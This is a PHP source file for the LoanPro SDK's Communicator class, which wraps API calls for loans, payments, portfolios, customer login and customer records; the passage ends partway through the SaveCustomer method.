<?php
/**
 *
 * Copyright 2017 Simnang, LLC.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 *
 */

namespace Simnang\LoanPro\Communicator;


use Simnang\LoanPro\Constants\BASE_ENTITY;
use Simnang\LoanPro\Constants\CREDIT_SCORE;
use Simnang\LoanPro\Constants\CUSTOM_QUERY_STATUS;
use Simnang\LoanPro\Constants\CUSTOMER_ROLE;
use Simnang\LoanPro\Constants\ENTITY_TYPES;
use Simnang\LoanPro\Constants\LOAN;
use Simnang\LoanPro\Customers\CreditScoreEntity;
use Simnang\LoanPro\Customers\CustomerEntity;
use Simnang\LoanPro\Customers\PaymentAccountEntity;
use Simnang\LoanPro\Exceptions\ApiException;
use Simnang\LoanPro\Exceptions\InvalidStateException;
use Simnang\LoanPro\Iteration\Iterator\CustomerSearchIterator;
use Simnang\LoanPro\Iteration\Iterator\LoanSearchIterator;
use Simnang\LoanPro\Iteration\Params\AggregateParams;
use Simnang\LoanPro\Iteration\Params\CustomQueryColumnParams;
use Simnang\LoanPro\Iteration\Params\FilterParams;
use Simnang\LoanPro\Iteration\Params\PaginationParams;
use Simnang\LoanPro\Iteration\Params\SearchParams;
use Simnang\LoanPro\LoanProSDK;
use Simnang\LoanPro\Loans\LoanEntity;
use Simnang\LoanPro\Loans\LoanSetupEntity;
use Simnang\LoanPro\Loans\LoanStatusArchiveEntity;
use Simnang\LoanPro\Loans\PaymentEntity;
use Simnang\LoanPro\Validator\FieldValidator;

/**
 * Class Communicator
 * This is the LoanPro API Communicator. It provides wrapper functions for performing common operations with the LoanPro API.
 * It can operate in two modes: Asynchronous or Synchronous.
 *
 * In Asynchronous mode, all operations will return promises. In Synchronous mode, all operations will return the resulting object.
 * For example, in Async mode getLoan will return a promise whose result is either the resulting loan or the error message from the server.
 *  In Sync mode, getLoan will either return the resulting loan or the error message from the server.
 *
 * Error messages from the server are thrown as an ApiException.
 *
 * Furthermore, there are multiple environments that can be communicated with. These environments are set at creation of an object. They are:
 *  * PRODUCTION - This is the LoanPro production site
 *  * STAGING - This is the LoanPro staging site
 *
 * Furthermore, there is support for API versioning. API versioning is currently not implemented but is reserved for future use.
 *
 * @package Simnang\LoanPro\Communicator
 */
class Communicator
{
    /**
     * PRODUCTION site
     */
    const PRODUCTION = "";
    /**
     * STAGING site
     */
    const STAGING = "staging-";

    /**
     * Base URL of Communicator
     * @var string
     */
    private $baseUrl;

    /**
     * API Client used for communication; can be synchronous or asynchronous
     * @var ApiClient
     */
    private $client;

    /**
     * Constructor for a new Communicator object, sets client type, environment, and API/SDK version
     * @param int $clientType
     * @param string $environment
     * @param int $apiVersion
     */
    private function __construct($clientType = ApiClient::TYPE_SYNC, $environment = Communicator::PRODUCTION, $apiVersion = 1){
        $apiVersion = max(intval($apiVersion), 1);
        $environment = (in_array($environment, (new \ReflectionClass('Simnang\LoanPro\Communicator\Communicator'))->getConstants()) ? $environment : Communicator::PRODUCTION);
        $this->baseUrl = LoanProSDK::GetEnvUrl();
        switch($clientType){
            case ApiClient::TYPE_ASYNC:
                $this->client = ApiClient::GetAPIClientAsync();
                break;
            case ApiClient::TYPE_SYNC:
                $this->client = ApiClient::GetAPIClientSync();
                break;
        }
    }


    ///////////////////////////////////////////////////////
    ////        UTILITIES SECTION
    ///////////////////////////////////////////////////////

    /**
     * Attempts to login to the customer facing website. Returns an array with the first item being whether or not login was successful and the second item is the response from the server.
     * 
     * If the server has created a session, then the session id will be returned in the session key-value-pair.
     * 
     * If the server supports redirect-logins, then the URL to redirect the user to to login to LoanPro's customer-facing site will be in the redirectTo key-value-pair.
     *
     * If login was successful, the login from the server will hold the customer id and name.
     *
     * @param string $username - Username of customer
     * @param string $password - Password of user
     * @return array
     * @throws ApiException
     */
    public function LoginToCustomerSite($username ='', $password = ''){
        $tenantId = ApiClient::GetTenantId();
        $response = $this->client->POST("$this->baseUrl/tenants($tenantId)/customers/authenticate",['username'=>$username, 'password'=>$password]);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']) && isset($body['d']['id'])){
                $res = [true, $body['d']];
                if(isset($body['d']['sessionId']))
                    $res["session"] = $body['d']['sessionId'];
                if(isset($body['d']['postLoginPage']))
                    $res['redirectTo'] = $body['d']['postLoginPage'];
                return $res;
            }
        }
        else if($response->getStatusCode() == 401) {
            $body = json_decode($response->getBody(), true);
            return [false, $body];
        }
        throw new ApiException($response);
    }
    
    /**
     * Will reset a customer's password by sending them a request-verification email. If the customer wants to continue the password reset, he/she will need the click the link in the email.
     *
     * If the connection to the server worked, then it will return true. Otherwise it wlil throw an ApiException.
     *
     * @param string $username - Username of customer
     * @return bool
     * @throws ApiException
     */
    public function ResetCustomerPassword($username =''){
        $tenantId = ApiClient::GetTenantId();
        $response = $this->client->POST("$this->baseUrl/tenants($tenantId)/customers/reset-password",['username'=>$username]);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']) && isset($body['d']['success'])){
                return true;
            }
        }
        throw new ApiException($response);
    }

    /**
     * Generates and returns a new communicator object for the LoanPro API. Also ensures that credentials have bene properly set
     * @param int $clientType
     * @param string $environment
     * @param int $apiVersion
     * @return Communicator
     * @throws InvalidStateException
     */
    public static function GetCommunicator($clientType = ApiClient::TYPE_SYNC, $environment = Communicator::PRODUCTION, $apiVersion = 1){
        if(!ApiClient::AreTokensSet())
            throw new InvalidStateException("API tokens are not setup!");
        return new Communicator($clientType , $environment, $apiVersion);
    }

    /**
     * Downloads a file at a url via a GET request
     * @param string   $url - The url of the file to download
     * @return null|false|string
     * @throws ApiException
     */
    public function DownloadFile($url){
        $response = $this->client->GET($url);
        if($response->getStatusCode() == 200) {
            return (string)$response->getBody();
        }
        throw new ApiException($response);
    }

    ///////////////////////////////////////////////////////
    ////        LOAN SECTION
    ///////////////////////////////////////////////////////


    /**
     * Returns an array of loan entities
     * @param array                 $expandProps - expand properties to expand by
     * @param PaginationParams|null $paginationParams - Pagination options
     * @param FilterParams|null     $filter - filter object
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoans($expandProps = [], PaginationParams $paginationParams = null, FilterParams $filter = null){
        $query = [];
        if(!is_null($paginationParams))
            $paginationParams = $paginationParams->setUseSkip(true);
        $query[] = (string)$paginationParams;
        $query[] = (string)$filter;
        $exp = implode(',', $expandProps);
        if($exp)
            $query[] = "\$expand=$exp";
        $query = '?'.implode('&',array_filter($query));
        if($query === '?')
            $query = '';
        $res = $this->client->GET("$this->baseUrl/odata.svc/Loans()$query");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = LoanProSDK::GetInstance()->CreateLoanFromJSON($val);
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Performs a loan search
     * @param SearchParams|null     $searchParams - parameters to search by
     * @param AggregateParams|null  $aggParams - aggregate data to pull
     * @param PaginationParams|null $paginationParams - pagination settings
     * @return LoanSearchIterator
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function SearchLoans(SearchParams $searchParams, AggregateParams $aggParams, PaginationParams $paginationParams = null){
        $query = [];
        $query[] = (string)$paginationParams;
        $query = '?'.implode('&',array_filter($query));
        if($query === '?')
            $query = '';

        $request = array_merge($searchParams->Get(), $aggParams->Get());

        $res = $this->client->POST("$this->baseUrl/Loans/Autopal.Search()$query", $request);

        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = $val;
                }
                $ret = ['results'=>$ret, 'aggregates'=>[]];
                if(isset($body['d']['summary']) && isset($body['d']['summary']['aggregations'])){
                    $ret['aggregates'] = $body['d']['summary']['aggregations'];
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Gets a loan from the LoanPro servers.
     * @param int $loanId - ID of loan to pull
     * @param array $expandProps - array of properties to expand
     * @param bool|true $nopageProps
     * @return LoanEntity
     * @throws ApiException
     */
    public function GetLoan($loanId, $expandProps = [], $nopageProps = true){
        if(count($expandProps))
            $expandProps = '?$expand='.implode(',',$expandProps);
        else
            $expandProps = "";

        if($nopageProps){
            if($expandProps == "") $expandProps = "?nopaging=true";
            else $expandProps .= "&nopaging=true";
        }

        $client = $this->client;

        $url = "$this->baseUrl/odata.svc/Loans($loanId)$expandProps";
        $response = $client->GET($url);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']))
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($response->getBody(), true)['d']);
            else
                throw new ApiException($response);
        }
        throw new ApiException($response);
    }

    public function GetLoanNested($loanId, $nested, PaginationParams $paginationParams = null){
        $client = $this->client;

        $url = "$this->baseUrl/odata.svc/Loans($loanId)/$nested";
        $response = $client->GET($url);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if (isset($body['d'])) {
                $classType = LoanProSDK::GetInstance()->LookUpClassType($nested);
                $res = [];
                foreach($body['d']['results'] as $r)
                    $res[] = LoanProSDK::GetInstance()->CreateClassFromJSON_Public($classType, $r);
                return $res;
            }
        }
        throw new ApiException($response);
    }

    /**
     * Saves the loan to the server via a PUT request (or a POST request if there is no ID)
     * Either returns the resulting loan/response if there's an error (if synchronous), or a promise that returns the resulting loan/response
     * @param  LoanEntity $loan - Loan to save
     * @return LoanEntity
     * @throws InvalidStateException
     * @throws ApiException
     */
    public function SaveLoan(LoanEntity $loan){
        $client = $this->client;
        $id = $loan->Get(BASE_ENTITY::ID);
        if(is_null($id)) {
            if(is_null($loan->Get(LOAN::LOAN_SETUP)))
                throw new InvalidStateException("Cannot create new loan on server without loan setup!");
            $response = $client->POST("$this->baseUrl/odata.svc/Loans()", $loan);
        }
        else
            $response = $client->PUT("$this->baseUrl/odata.svc/Loans($id)",$loan);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d'])) {
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($response->getBody(), true)['d']);
            }
            else
                throw new ApiException($response);;
        }
        throw new ApiException($response);
    }

    /**
     * Activates the given loan
     *  Returns true if successful
     * @param  int  $loan - loan to activate
     * @return bool
     * @throws InvalidStateException
     * @throws ApiException
     */
    public function ActivateLoan($loanId){

        $response = $this->client->POST(("$this->baseUrl/Loans($loanId)/AutoPal.Activate()"));

        if($response->getStatusCode() == 200)
            return true;
        throw new ApiException($response);
    }

    /**
     * Deletes a loan and returns true if successul
     * @param int $loanId - loan to delete
     * @param bool|false $areYouSure - must be set to true to delete
     * @return bool
     * @throws \Exception
     * @throws ApiException
     */
    public function DeleteLoan($loanId, $areYouSure = false){
        if(!$areYouSure)
            throw new \Exception("Unsure deletion, either state that you are sure or don't delete the loan");

        $response = $this->client->DELETE("$this->baseUrl/odata.svc/Loans($loanId)");

        if($response->getStatusCode() == 200) {
            return true;
        }
        throw new ApiException($response);
    }

    /**
     * Creates a modification for a loan
     * @param int        $loanId - ID of loan to make a modification for
     * @return bool
     * @throws ApiException
     */
    public function ModifyLoan($loanId){
        $client = $this->client;
        $res = $client->POST("$this->baseUrl/Loans($loanId)/Autopal.CreateModification()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['success'])) {
                return $body['d']['success'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Cancels the latest modification for a loan and returns if successful
     * @param int        $loanId
     * @return bool
     * @throws ApiException
     */
    public function CancelLatestModification($loanId){
        $client = $this->client;
        $response = $client->POST("$this->baseUrl/Loans($loanId)/Autopal.CancelModification()");

        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']) && isset($body['d']['success']))
                return $body['d']['success'];
        }
        throw new ApiException($response);
    }

    /**
     * Returns the LoanSetup from the previous modification for the loan
     * @param  int $loanId
     * @return LoanSetupEntity
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetPreModSetup($loanId){
        $response = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetPreModSetup()");


        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']))
                return LoanProSDK::GetInstance()->CreateLoanSetupFromJSON($body['d']);
        }
        throw new ApiException($response);
    }

    /**
     * Gets the next scheduled payment info for a loan
     * @param $loanId
     * @return mixed
     * @throws ApiException
     */
    public function NextScheduledPayment($loanId){
        $res = $this->client->POST("$this->baseUrl/odata.svc/Loans($loanId)/Autopal.GetNextScheduledPayment()?count");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns the loan status archive for a loan
     * @param      $loanId - ID of the loan to use
     * @param null $datetimeStart - datetime period to start the range for pulling the archive
     * @param null $datetimeEnd - datetime period to end the range for pulling the archive
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanStatusArchive($loanId, $datetimeStart = null, $datetimeEnd = null){
        $pagParams = new PaginationParams(true);
        $pagParams->SetOrdering(['date'], PaginationParams::DESCENDING_ORDER);

        $datetimeStart = (!is_null($datetimeStart)) ? FieldValidator::GetDate($datetimeStart) : (new \DateTime())->setTime(23,55,55)->sub(new \DateInterval('P2D'))->getTimestamp();
        $datetimeEnd = (!is_null($datetimeEnd)) ? FieldValidator::GetDate($datetimeEnd) : (new \DateTime())->setTime(23,55,55)->add(new \DateInterval('P1D'))->getTimestamp();

        $datetimeStart = (new \DateTime())->setTimestamp($datetimeStart)->format('Y-m-d\Th:i:s');
        $datetimeEnd = (new \DateTime())->setTimestamp($datetimeEnd)->format('Y-m-d\Th:i:s');

        $filterParams = FilterParams::MakeFromODataString("loanId eq $loanId and date ge datetime'$datetimeStart' and date le datetime'$datetimeEnd'");
        $query = "?".implode('&',array_map('urlencode',['all',(string)$pagParams, (string)$filterParams]));
        $res = $this->client->GET("$this->baseUrl/odata.svc/LoanStatusArchive$query");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = LoanProSDK::GetInstance()->CreateClassFromJSON_Public(LoanStatusArchiveEntity::class, $val);
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns the JSON array for the loan status on a date
     * @param int $loanId - ID of loan to get status for
     * @param     $date   - date to get status on
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanStatusOnDate($loanId, $date){
        $date = FieldValidator::GetDateString($date);
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetStatus($date)");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Gets the interest based on tenant tier settings
     * @param int $loanId - ID of loan id
     * @return number
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanIntOnTier($loanId){
        $res = $this->client->PUT("$this->baseUrl/Loans($loanId)/AutoPal.GetInterestBasedOnTier()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['interest'])) {
                return $body['d']['interest'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns the last activity date for the loan
     * @param  int  $loanId = ID of loan to get activity date fore
     * @return int|null
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLastActivityDate($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/AutoPal.GetLastActivityDate()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['lastActivityDate'])) {
                return FieldValidator::GetDate($body['d']['lastActivityDate']);
            }
        }
        throw new ApiException($res);
    }

    /**
     * Queries the server about whether or not the loan is setup and then returns the result
     * @param int $loanId - ID of loan to check for
     * @return bool
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function IsSetup($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.isSetup()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['setup'])) {
                return $body['d']['setup'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Queries the server about whether or not the loan is a late fee candidate
     * @param int $loanId - ID of loan to check for
     * @return bool
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function IsLateFeeCandidate($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.isLateFeeCandidate()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['isCandidate'])) {
                return $body['d']['isCandidate'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns the JSON array for the payment summaries for a loan
     * @param int $loanId - ID of loan to check for
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetPaymentSummary($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetPaymentSummary()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                return $body['d']['results'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns the JSON array for the final payment difference
     * @param int $loanId - loan to check for
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetFinalPaymentDiff($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetFinalPaymentDiff()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns admin stats for the loan
     * @param int $loanId
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanAdminStats($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetAdminStats()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns tenant context variables (useful for custom query)
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetContextVariables(){
        $res = $this->client->GET("$this->baseUrl/odata.svc/ContextVariables?nopaging");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                return $body['d']['results'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Returns interest fees history
     * @param int $loanId
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanInterestFeesHistory($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetInterestFeesHistory()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * returns loan balance history
     * @param int $loanId
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanBalanceHistory($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetBalanceHistory()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * returns loan flag archive report
     * @param  int $loanId
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoanFlagArchiveReport($loanId){
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetFlagArchiveReport");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return $body['d'];
            }
        }
        throw new ApiException($res);
    }

    /**
     * Grabs the payoff for the specified loan
     * @param $loanId - ID of loan to grab payoff for
     * @param $datetime - timestamp for when to grab the payoff
     * @return array - Array of payoff items (each is an array with keys 'date', 'payoff', etc.)
     * @throws ApiException
     */
    public function GetPayoff($loanId, $datetime){
        $datetime = FieldValidator::GetDate($datetime);
        if(is_null($datetime)){
            $datetime = (new \DateTime())->getTimestamp();
        }
        $dt = new \DateTime();
        $dt->setTimestamp($datetime);
        $date = $dt->format('Y-m-d');
        $res = $this->client->GET("$this->baseUrl/Loans($loanId)/Autopal.GetLoanPayoff($date)");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                $ret = [];
                foreach($body['d'] as $val){
                    $ret[] = $val;
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Saves the payment to a specified loan
     * @param int           $loanId
     * @param PaymentEntity $pmt
     * @return array
     * @throws ApiException
     */
    public function SavePayment($loanId, PaymentEntity $pmt){
        $pmt = $pmt->Rem(BASE_ENTITY::ID);
        $res = $this->client->PUT("$this->baseUrl/odata.svc/Loans($loanId)",[
            "Payments"=>[
                "results"=>[
                    $pmt
                ]
            ]
        ]);
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($res->getBody(), true)['d']);
            }
        }
        throw new ApiException($res);
    }
    /**
     * Adds a portfolio to the specified loan
     * @param int           $loanId
     * @param int           $portfolioId
     * @return LoanEntity
     * @throws ApiException
     */
    public function AddPortfolio($loanId, $portfolioId){
        $res = $this->client->PUT("$this->baseUrl/odata.svc/Loans($loanId)",[
            LOAN::PORTFOLIOS=>[
                "results"=>[
                    [
                        "__metadata"=>[
                            "uri"=> "/api/1/odata.svc/Portfolios(id=$portfolioId)",
                            "type"=> ENTITY_TYPES::PORTFOLIO
                        ]
                    ]
                ]
            ]
        ]);
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($res->getBody(), true)['d']);
            }
        }
        throw new ApiException($res);
    }

    /**
     * Removes a portfolio from the specified loan
     * @param int           $loanId
     * @param int           $portfolioId
     * @return LoanEntity
     * @throws ApiException
     */
    public function RemPortfolio($loanId, $portfolioId){
        $res = $this->client->PUT("$this->baseUrl/odata.svc/Loans($loanId)",[
            LOAN::PORTFOLIOS=>[
                "results"=>[
                    [
                        "__destroy"=>true,
                        "__id"=>$portfolioId,
                        "__metadata"=>[
                            "uri"=> "/api/1/odata.svc/Portfolios(id=$portfolioId)",
                            "type"=> ENTITY_TYPES::PORTFOLIO
                        ]
                    ]
                ]
            ]
        ]);
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($res->getBody(), true)['d']);
            }
        }
        throw new ApiException($res);
    }

    /**
     * Adds a portfolio to the specified loan
     * @param int           $loanId
     * @param int           $portfolioId
     * @return LoanEntity
     * @throws ApiException
     */
    public function AddSubPortfolio($loanId, $portfolioId){
        $res = $this->client->PUT("$this->baseUrl/odata.svc/Loans($loanId)",[
            LOAN::SUB_PORTFOLIOS=>[
                "results"=>[
                    [
                        "__metadata"=>[
                            "uri"=> "/api/1/odata.svc/Portfolios(id=$portfolioId)",
                            "type"=> ENTITY_TYPES::SUB_PORTFOLIO
                        ]
                    ]
                ]
            ]
        ]);
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($res->getBody(), true)['d']);
            }
        }
        throw new ApiException($res);
    }

    /**
     * Removes a portfolio from the specified loan
     * @param int           $loanId
     * @param int           $portfolioId
     * @return LoanEntity
     * @throws ApiException
     */
    public function RemSubPortfolio($loanId, $portfolioId){
        $res = $this->client->PUT("$this->baseUrl/odata.svc/Loans($loanId)",[
            LOAN::SUB_PORTFOLIOS=>[
                "results"=>[
                    [
                        "__destroy"=>true,
                        "__id"=>$portfolioId,
                        "__metadata"=>[
                            "uri"=> "/api/1/odata.svc/Portfolios(id=$portfolioId)",
                            "type"=> ENTITY_TYPES::SUB_PORTFOLIO
                        ]
                    ]
                ]
            ]
        ]);
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d'])) {
                return LoanProSDK::GetInstance()->CreateLoanFromJSON(json_decode($res->getBody(), true)['d']);
            }
        }
        throw new ApiException($res);
    }


    ///////////////////////////////////////////////////////
    ////        CUSTOMER SECTION
    ///////////////////////////////////////////////////////

    /**
     * Returns an array of customer entities
     * @param array                 $expandProps - expand properties to expand by
     * @param PaginationParams|null $paginationParams - Pagination options
     * @param FilterParams|null     $filter - filter object
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetCustomers($expandProps = [], PaginationParams $paginationParams = null, FilterParams $filter = null){
        $query = [];
        if(!is_null($paginationParams))
            $paginationParams = $paginationParams->setUseSkip(true);
        $query[] = (string)$paginationParams;
        $query[] = (string)$filter;
        $exp = implode(',', $expandProps);
        if($exp)
            $query[] = "\$expand=$exp";
        $query = '?'.implode('&',array_filter($query));
        if($query === '?')
            $query = '';
        $res = $this->client->GET("$this->baseUrl/odata.svc/Customers()$query");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = LoanProSDK::GetInstance()->CreateCustomerFromJSON($val);
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    public function GetCustomerNested($custId, $nested, PaginationParams $pagination = null){
        $client = $this->client;

        $url = "$this->baseUrl/odata.svc/Customer($custId)/$nested";
        $response = $client->GET($url);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if (isset($body['d'])) {
                $classType = LoanProSDK::GetInstance()->LookUpClassType($nested);
                $res = [];
                foreach($body['d']['results'] as $r)
                    $res[] = LoanProSDK::GetInstance()->CreateClassFromJSON_Public($classType, $r);
                return $res;
            }
        }
        throw new ApiException($response);
    }

    /**
     * Performs a customer search
     * @param SearchParams|null     $searchParams - parameters to search by
     * @param AggregateParams|null  $aggParams - aggregate data to pull
     * @param PaginationParams|null $paginationParams - pagination settings
     * @return CustomerSearchIterator
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function SearchCustomers(SearchParams $searchParams, AggregateParams $aggParams, PaginationParams $paginationParams = null){
        $query = [];
        $query[] = (string)$paginationParams;
        $query = '?'.implode('&',array_filter($query));
        if($query === '?')
            $query = '';

        $request = array_merge($searchParams->Get(), $aggParams->Get());

        $res = $this->client->POST("$this->baseUrl/Customers/Autopal.Search()$query", $request);

        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = $val;
                }
                $ret = ['results'=>$ret, 'aggregates'=>[]];
                if(isset($body['d']['summary']) && isset($body['d']['summary']['aggregations'])){
                    $ret['aggregates'] = $body['d']['summary']['aggregations'];
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Gets a customer from the LoanPro servers.
     * @param int   $id - ID of customer to pull
     * @param array $expandProps - array of properties to expand
     * @param bool|true $nopageProps
     * @return CustomerEntity
     * @throws ApiException
     */
    public function GetCustomer($id, $expandProps = [], $nopageProps = true){
        if(count($expandProps))
            $expandProps = '?$expand='.implode(',',$expandProps);
        else
            $expandProps = "";

        if($nopageProps){
            if($expandProps == "") $expandProps = "?nopaging=true";
            else $expandProps .= "&nopaging=true";
        }

        $client = $this->client;

        $url = "$this->baseUrl/odata.svc/Customers($id)$expandProps";
        $response = $client->GET($url);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']))
                return LoanProSDK::GetInstance()->CreateCustomerFromJSON(json_decode($response->getBody(), true)['d']);
            else
                throw new ApiException($response);
        }
        throw new ApiException($response);
    }

    /**
     * Saves the customer to the server via a PUT request (or a POST request if there is no ID)
     * Returns the resulting customer
     * @param  CustomerEntity $cust - Customer to save
     * @return CustomerEntity
     * @throws InvalidStateException
     * @throws ApiException
     */
    public function SaveCustomer(CustomerEntity $cust){
        $client = $this->client;
        $id = $cust->Get(BASE_ENTITY::ID);
        if(is_null($id)) {
            $response = $client->POST("$this->baseUrl/odata.svc/Customers()", $cust);
        }
        else
            $response = $client->PUT("$this->baseUrl/odata.svc/Customers($id)",$cust);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d'])) {
